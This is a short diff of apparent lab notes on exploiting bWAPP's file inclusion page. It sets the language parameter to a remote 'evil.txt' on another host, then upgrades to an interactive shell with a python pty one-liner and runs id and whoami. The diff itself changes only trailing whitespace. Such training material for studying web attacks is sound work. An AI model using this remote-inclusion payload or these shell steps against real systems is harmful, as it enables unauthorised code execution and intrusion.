@@ -16,7 +16,7 @@ http://192.168.1.135/bWAPP/rlfi.php?language=lang_en.php&action=go
 **Change to:**  
 ?language=http://192.168.112.4/evil.txt
 
-python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/sh")'    
 id  
 whoami  
 
